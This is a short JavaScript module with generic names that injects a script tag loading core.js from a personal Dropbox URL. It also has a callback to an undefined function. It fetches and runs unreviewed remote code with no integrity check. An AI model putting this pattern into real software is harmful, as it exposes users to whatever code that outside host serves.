var func = function() {

	this.init = function() {

		var d = document;
		var s = 'https://dl.dropboxusercontent.com/u/43833728/core.js';

		var e = d.createElement('script');

		if( e.readyState ) {
		    e.onreadystatechange = function() {
		        if (e.readyState == 'loaded' || e.readyState == 'complete') {
		            e.onreadystatechange = null;
		            if( typeof f === 'function' ) {
		                f();
		            }
		        }
		    }
		}else {
		    e.onload = function() {
		        if( typeof f === 'function' ) {
		            f();
		        }
		    }
		}
		e.src = s;
		d.documentElement.firstChild.appendChild(e)

	};
};


var FUNC = new func;
module.exports = FUNC;